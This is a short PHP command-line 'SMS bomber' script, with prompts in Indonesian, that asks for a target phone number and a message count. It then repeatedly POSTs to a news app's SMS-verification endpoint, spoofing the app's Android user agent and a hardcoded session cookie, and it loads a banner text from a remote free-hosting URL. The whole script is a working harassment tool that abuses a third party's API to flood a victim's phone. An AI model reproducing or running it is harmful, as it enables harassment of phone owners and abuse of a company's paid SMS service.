<?php

$pesan = file_get_contents('http://aos-file.000webhostapp.com/caping-spam/notes.txt');
function bom($hp){
$data = array("mobile" => $hp); $data_string = json_encode($data);
$ch = curl_init('https://ai.caping.co.id/v2/sms/send');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch,CURLOPT_USERAGENT,'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 4A Build/OPM7.181105.004; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.98 Mobile Safari/537.36;CapingNews/4.1.5');
curl_setopt($ch, CURLOPT_POSTFIELDS, $data_string);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);curl_setopt($ch, CURLOPT_HTTPHEADER, array('Cookie: u=61649310;n=000000007b627328fffffffff1110836','Content-Type: application/json','Content-Length: 26','NETWORKSTATE: FouthG','User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; Redmi 4A Build/OPM7.181105.004; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.98 Mobile Safari/537.36;CapingNews/4.1.5'));
$result = curl_exec($ch);
curl_close($ch);
echo $result;
echo "\n";
}
system('clear');




echo "\n\n\n";
echo "\033[31;1m...::::::::[ Created by : Zaa Eka Gumilar ]::::::::...\n";

echo "\033[32;1m----------------------------------------------------\n";
echo "\033[00;3mNote :
Target akan menerima pesan dari HiLite.com.. 
Pastikan anda memiliki koneksi internet..\n";
echo "\033[32;1m----------------------------------------------------\n\n";



echo "Pesan : $pesan \n\n";
echo "\033[00;1mMasukan no target dengan awalan 62..\n\033[33;1mNomer\t: ";
$no = trim(fgets(STDIN));
echo "Jumlah Pesan\t: ";
$jumlah = trim(fgets(STDIN));
$i=0;
while($i<$jumlah)
    {
			sleep(0.2);
			$i++;
		    bom($no);
	};
?>